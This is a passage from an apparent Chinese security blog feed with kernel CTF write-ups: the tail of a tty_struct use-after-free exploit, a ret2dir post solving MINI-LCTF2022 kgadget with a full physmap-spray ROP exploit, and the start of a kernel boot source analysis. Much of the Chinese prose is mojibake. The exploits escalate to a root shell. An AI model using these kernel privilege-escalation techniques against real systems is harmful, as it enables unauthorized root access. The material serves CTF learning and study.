<span class="hljs-type">int</span> fd1 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>), fd2 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>);<br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);  <span class="hljs-comment">// tty_structç»“æ„ä½“å¤§å°ä¸º0x2e0</span><br>    close(fd1);<br><br>    <span class="hljs-type">int</span> tty_fd = open_dev(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> fake_ops[<span class="hljs-number">8</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, XCHG_EAX_ESP_RET&#125;;<br>    <span class="hljs-type">size_t</span> fake_stack = (<span class="hljs-type">size_t</span>)(&amp;fake_ops) &amp; <span class="hljs-number">0xffffffff</span>;<br>    <span class="hljs-type">size_t</span> * fake_stack_ptr = mmap((<span class="hljs-type">size_t</span>)(fake_stack &amp; <span class="hljs-number">0xfffffffffffff000</span>), <span class="hljs-number">0x10000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!fake_stack_ptr)<br>        fail_print(<span class="hljs-string">&quot;Mmap Fail!&quot;</span>);<br>    fake_stack_ptr = (<span class="hljs-type">size_t</span>)fake_stack;<br><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    fake_stack_ptr[i++] = POP_RDI_RET;<br>    fake_stack_ptr[i++] = <span class="hljs-number">0x6f0</span>;<br>    fake_stack_ptr[i++] = MOV_CR4_RDI_POP_RBP_RET;<br>    fake_stack_ptr[i++] = <span class="hljs-number">0</span>;<br>    fake_stack_ptr[i++] = (<span class="hljs-type">size_t</span>)get_root_privilige;<br>    fake_stack_ptr[i++] = SWAPGS_POP_RBP_RET;<br>    fake_stack_ptr[i++] = <span class="hljs-number">0</span>;<br>    fake_stack_ptr[i++] = IRETQ_RET;<br>    fake_stack_ptr[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    fake_stack_ptr[i++] = user_cs;<br>    fake_stack_ptr[i++] = user_rflags;<br>    fake_stack_ptr[i++] = user_sp + <span class="hljs-number">8</span>;<br>    fake_stack_ptr[i++] = user_ss;<br><br>    <span class="hljs-type">int</span> tty_cnt = <span class="hljs-number">4</span> + <span class="hljs-number">4</span> + <span class="hljs-number">8</span> + <span class="hljs-number">8</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];<br>    read(fd2, buf, tty_cnt);    <span class="hljs-comment">// 0xffff880005f03800</span><br><br>    *(<span class="hljs-type">size_t</span> *)(&amp;buf[tty_cnt]) = &amp;fake_ops;<br>    write(fd2, buf, tty_cnt + <span class="hljs-number">8</span>);<br><br>    <span class="hljs-type">int</span> buf1[] = &#123;<span class="hljs-number">0</span>&#125;;<br>    write(tty_fd, buf1, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel ROP ret2dir</title>
    <link href="/2023/08/10/kernel-ROP-ret2dir/"/>
    <url>/2023/08/10/kernel-ROP-ret2dir/</url>
    
    <content type="html"><![CDATA[<p>è®ºå¦‚ä½•é€æ¸åç¦»ä¸»é¢˜ï¼šret2dirçœ‹ä¸æ‡‚â†’çœ‹å†…å­˜ç›¸å…³æºç è§£æâ†’æƒ³è°ƒè¯•çœ‹é¡µè¡¨åˆå§‹åŒ–â†’æ‰¾ä¸åˆ°å…¥å£ä»BIOSå¼€å§‹è°ƒè¯•â†’è°ƒè¯•åˆ°é¡µè¡¨åˆå§‹åŒ–ç»“æŸâ†’ç»ˆäºç»“æŸäº†å¼€å§‹ret2dir</p><p>æ„Ÿè§‰å¹²äº†å‡ å¤©è·Ÿæ²¡å¹²ä¸€æ ·ï¼Œä½†ç¡®å®å¯¹å†…å­˜æ˜ å°„æœ‰äº†å®æ„Ÿï¼Œå‹‰å¼ºç®—ä¸€ç§æ”¶è·å§ï¼ˆä»¥åå†ä¹Ÿä¸é’»ç‰›è§’å°–äº†æˆ‘å‘èª“â•¥ï¹â•¥â€¦ï¼‰</p><span id="more"></span><p>å…ˆè¯´æ˜ä¸€ä¸‹ä¸€ä¸ªç”¨åˆ°çš„ç»“æ„ä½“pt_regs</p><h1 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h1><p>pt_regsç»“æ„ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ax;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> dx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> si;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> di;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> orig_ax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨è¿›è¡Œç³»ç»Ÿè°ƒç”¨ä¹‹å‰ä¼šæŠŠå¯„å­˜å™¨å…¥æ ˆï¼Œå…¥æ ˆçš„ç»“æ„å’Œpt_regsç›¸ç¬¦ï¼ˆæ˜¯æ­£ç€çš„ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SYM_CODE_START(entry_SYSCALL_64)<br>UNWIND_HINT_EMPTY<br><br>swapgs<br>/* tss.sp2 is scratch space. */<br>movq%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)<br>SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp<br>movqPER_CPU_VAR(cpu_current_top_of_stack), %rsp<br><br>SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)<br><br>/* Construct struct pt_regs on stack */<br>pushq$__USER_DS/* pt_regs-&gt;ss */<br>pushqPER_CPU_VAR(cpu_tss_rw + TSS_sp2)/* pt_regs-&gt;sp */<br>pushq%r11/* pt_regs-&gt;flags */<br>pushq$__USER_CS/* pt_regs-&gt;cs */<br>pushq%rcx/* pt_regs-&gt;ip */<br>SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)<br>pushq%rax/* pt_regs-&gt;orig_ax */<br><br>PUSH_AND_CLEAR_REGS rax=$-ENOSYS<br><br>/* IRQs are off. */<br>movq%rax, %rdi<br>movq%rsp, %rsi<br>calldo_syscall_64/* returns with IRQs disabled */<br>â€¦â€¦<br></code></pre></td></tr></table></figure><p>æœ‰ä¸€éƒ¨åˆ†å‹æ ˆæ“ä½œåœ¨PUSH_AND_CLERT_REGSå®é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">.macro PUSH_AND_CLEAR_REGS rdx=%rdx rax=%rax save_ret=<span class="hljs-number">0</span><br>.<span class="hljs-keyword">if</span> \save_ret<br>pushq%rsi<span class="hljs-comment">/* pt_regs-&gt;si */</span><br>movq<span class="hljs-number">8</span>(%rsp), %rsi<span class="hljs-comment">/* temporarily store the return address in %rsi */</span><br>movq%rdi, <span class="hljs-number">8</span>(%rsp)<span class="hljs-comment">/* pt_regs-&gt;di (overwriting original return address) */</span><br>.<span class="hljs-keyword">else</span><br>pushq   %rdi<span class="hljs-comment">/* pt_regs-&gt;di */</span><br>pushq   %rsi<span class="hljs-comment">/* pt_regs-&gt;si */</span><br>.endif<br>pushq\rdx<span class="hljs-comment">/* pt_regs-&gt;dx */</span><br>pushq   %rcx<span class="hljs-comment">/* pt_regs-&gt;cx */</span><br>pushq   \rax<span class="hljs-comment">/* pt_regs-&gt;ax */</span><br>pushq   %r8<span class="hljs-comment">/* pt_regs-&gt;r8 */</span><br>pushq   %r9<span class="hljs-comment">/* pt_regs-&gt;r9 */</span><br>pushq   %r10<span class="hljs-comment">/* pt_regs-&gt;r10 */</span><br>pushq   %r11<span class="hljs-comment">/* pt_regs-&gt;r11 */</span><br>pushq%rbx<span class="hljs-comment">/* pt_regs-&gt;rbx */</span><br>pushq%rbp<span class="hljs-comment">/* pt_regs-&gt;rbp */</span><br>pushq%r12<span class="hljs-comment">/* pt_regs-&gt;r12 */</span><br>pushq%r13<span class="hljs-comment">/* pt_regs-&gt;r13 */</span><br>pushq%r14<span class="hljs-comment">/* pt_regs-&gt;r14 */</span><br>pushq%r15<span class="hljs-comment">/* pt_regs-&gt;r15 */</span><br>UNWIND_HINT_REGS<br>        â€¦â€¦<br></code></pre></td></tr></table></figure><h1 id="ä¾‹é¢˜ï¼šMINI-LCTF2022-kgadget"><a href="#ä¾‹é¢˜ï¼šMINI-LCTF2022-kgadget" class="headerlink" title="ä¾‹é¢˜ï¼šMINI-LCTF2022 - kgadget"></a>ä¾‹é¢˜ï¼šMINI-LCTF2022 - kgadget</h1><p>arttnba3å¸ˆå‚…çš„åšå®¢è®²çš„å¾ˆæ¸…æ¥šçš„äº†å°±ä¸è¯´äº†</p><h2 id="è°ƒè¯•è¿‡ç¨‹"><a href="#è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹"></a>è°ƒè¯•è¿‡ç¨‹</h2><p>è¿›å…¥call rbxï¼Œç¨‹åºè·³è‡³gadgetï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add    rsp, 0xa0<br>pop    rbx<br>pop    r12<br>pop    r13<br>pop    rbp<br>ret<br></code></pre></td></tr></table></figure><img src="/2023/08/10/kernel-ROP-ret2dir/gdb1.png" class title="gdb1"><p>æ‰§è¡Œå®Œgadgetåæ ˆé¡¶æ˜¯å‚¨å­˜r9çš„åœ°å€ï¼Œä¹‹åå°±æ˜¯try_hit</p><img src="/2023/08/10/kernel-ROP-ret2dir/gdb2.png" class title="gdb2"><p>æ‰§è¡Œå®Œr9çš„pop rspåtry_hitè¢«popåˆ°rspä¸­ï¼Œæ ˆå°±è¢«æ¬åˆ°äº†direct mapping areaé‡Œ</p><img src="/2023/08/10/kernel-ROP-ret2dir/gdb3.png" class title="gdb3"><p>ä¹‹åretå°±ä¼šæ‰§è¡Œå†™å…¥çš„ROPé“¾</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>è¿™æ¬¡ä½¿ç”¨commit_creds(&amp;init_cred)ææƒ</p><p>psï¼šè¦æ³¨æ„ä¸€ä¸‹ioctlçš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸ªæŒ‡é’ˆï¼Œä¸æ˜¯ç›´æ¥æ•°å€¼ä¼ é€’æ‰€ä»¥å¿…é¡»å°†gadgetå…ˆå†™è¿›ä¸€å—å†…æ ¸ç©ºé—´ï¼Œå³direct mapping area</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_RSP_0XA0_POP_RBX_POP_R12_POP_R13_POP_RBP_RET 0xffffffff810737fe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff8108c6f1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff8108c6f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a6b700</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810c92e0;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00fb0 + 27</span><br><br><span class="hljs-type">size_t</span> pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span> *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">size_t</span> try_hit;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_rop_chain</span><span class="hljs-params">(<span class="hljs-type">size_t</span> *rop)</span><br>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    rop[i++] = ADD_RSP_0XA0_POP_RBX_POP_R12_POP_R13_POP_RBP_RET;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>; i &lt;= (<span class="hljs-number">0xa0</span> + <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) / <span class="hljs-number">8</span>; i++)<br>        rop[i] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop[i++] = POP_RDI_RET;<br>    rop[i++] = INIT_CRED;<br>    rop[i++] = COMMIT_CREDS;<br>    rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)<span class="hljs-number">0</span>;<br>    rop[i++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp + <span class="hljs-number">8</span>;<br>    rop[i++] = user_ss;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br><br>    fd = open_dev(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Open Error!&quot;</span>);<br>    <span class="hljs-type">int</span> page_size = sysconf(_SC_PAGESIZE);<br>    <br>    <span class="hljs-type">size_t</span> rop_chain[page_size / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)];<br>    construct_rop_chain(rop_chain);<br>    <br>    trying_print(<span class="hljs-string">&quot;Spraying physmap...&quot;</span>);<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15000</span>; i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(!physmap_spray_arr[i])<br>            fail_print(<span class="hljs-string">&quot;Mmap Error!&quot;</span>);<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], rop_chain, page_size);<br>    &#125;<br><br>    trying_print(<span class="hljs-string">&quot;trigger physmap one_gadget...&quot;</span>);<br>    try_hit = <span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    pop_rsp_ret;&quot;</span><br>        <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>ROP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>rop</tag>
      
      <tag>ret2dir</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernelæºç åˆ†æ-ç³»ç»Ÿå¯åŠ¨ï¼ˆä¸€ï¼‰</title>
    <link href="/2023/08/08/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2023/08/08/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>å‰å‡ å¤©æ²‰è¿·è°ƒè¯•SeaBIOSæ— æ³•è‡ªæ‹”ï¼Œè°ƒäº†ä¸¤å¤©ç»ˆäºè·Ÿè¸ªå®Œäº†BIOSå’Œboot loaderçš„è¿‡ç¨‹è¿›å…¥å†…æ ¸å¯åŠ¨é˜¶æ®µäº†ï¼Œä¹‹åå†æ•´ç†ä¸€ä¸‹å¯èƒ½ä¼šå†™ä¸€ä¸‹SeaBIOSå’Œboot loaderçš„æºç åˆ†æå’Œè°ƒè¯•ï¼ˆç«‹ä¸€ä¸ªflagï¼‰</p><p>ä¹‹æ‰€ä»¥è°ƒè¯•SeaBIOSæ˜¯å› ä¸ºæƒ³ä»å¤´å¼€å§‹è°ƒè¯•å†…æ ¸ä½†æ‰¾ä¸åˆ°å…¥å£ï¼Œç„¶åæ”¯çº¿ä»»åŠ¡åšç€åšç€å°±åç¦»ä¸»çº¿äº†(Ë‰â–½Ë‰ï¼›)â€¦ï¼Œç°åœ¨ç»ˆäºå›å½’ä¸»çº¿äº†</p><p>psï¼šä¸»è¦å…³æ³¨å†…å­˜ç›¸å…³çš„éƒ¨åˆ†ï¼Œé¡µè¡¨å’Œæ®µä¹‹ç±»çš„</p><span id="more"></span><p>å†…æ ¸ç‰ˆæœ¬4.15.8ï¼Œx86_64</p><h1 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h1><p>kernelåŠ è½½åˆ°äº†ç‰©ç†åœ°å€0x10000ï¼Œæºç å¯ä»¥çœ‹å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#arch\x86\boot\header.S<br><br>BOOTSEG= 0x07C0/* original address of boot-sector */<br>SYSSEG= 0x1000/* historical load address &gt;&gt; 4 */<br></code></pre></td></tr></table></figure><p>æˆ–è€…gdbè°ƒè¯•ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ­¤æ—¶cså¯„å­˜å™¨çš„å€¼ä¸º0x1020</p><p>è¿›å…¥å†…æ ¸çš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯ä¸€ä¸ªè·³è½¬è‡³start_of_setupï¼Œåœ°å€ä¸º0x10268</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#arch\x86\boot\header.S<br><br># offset 512, entry point<br><br>.globl_start<br>_start:<br># Explicitly enter this as bytes, or the assembler<br># tries to generate a 3-byte jump here, which causes<br># everything else to push off to the wrong offset.<br>.byte0xeb# short (2-byte) jump<br>.bytestart_of_setup-1f<br></code></pre></td></tr></table></figure><p>start_of_setupçš„ä¸»è¦ä½œç”¨æœ‰</p><ul><li>ä¿è¯æ‰€æœ‰æ®µå¯„å­˜å™¨å€¼ç›¸ç­‰</li><li>å»ºç«‹æ ˆ</li><li>å»ºç«‹bssæ®µ</li><li>è·³è½¬è‡³mainå‡½æ•°</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#arch\x86\boot\header.S<br><br>.section &quot;.entrytext&quot;, &quot;ax&quot;<br>start_of_setup:<br># ä½¿dså’Œesç›¸ç­‰<br>movw%ds, %ax<br>movw%ax, %es<br>cld<br><br># å»ºç«‹æ ˆï¼šåˆ¤æ–­ssæ˜¯å¦ç­‰äºdsï¼Œå¦‚æœç­‰äºåˆ™è¯´æ˜æ ˆå·²å»ºç«‹<br><br>movw%ss, %dx<br>cmpw%ax, %dx# %ds == %ss?<br>movw%sp, %dx<br>je2f# -&gt; assume %sp is reasonably set<br><br># ssä¸ç­‰äºdsï¼Œæ ˆä¸åˆæ³•ï¼Œå»ºç«‹æ–°æ ˆ<br># å¦‚æœä½¿ç”¨å †ï¼Œåˆ™åœ¨å †åœ°å€ç»“æŸå¤„å»ºç«‹æ ˆï¼Œå¦åˆ™åœ¨_endå¤„å»ºç«‹æ ˆ<br>movw$_end, %dx<br>testb$CAN_USE_HEAP, loadflags<br>jz1f<br>movwheap_end_ptr, %dx<br>1:addw$STACK_SIZE, %dx<br>jnc2f<br>xorw%dx, %dx<br><br>2:# æ­¤æ—¶dxæŒ‡å‘æ ˆé¡¶<br>andw$~3, %dx# å¯¹é½åˆ¤æ–­<br>jnz3f<br>movw$0xfffc, %dx# ç¡®ä¿dxä¸ä¸ºé›¶<br>3:movw%ax, %ss# æ ˆåŸºå€å’Œæ•°æ®æ®µåŸºå€ç›¸åŒ<br>movzwl%dx, %esp<br>sti# æ ˆå»ºç«‹å®Œæ¯•<br><br># 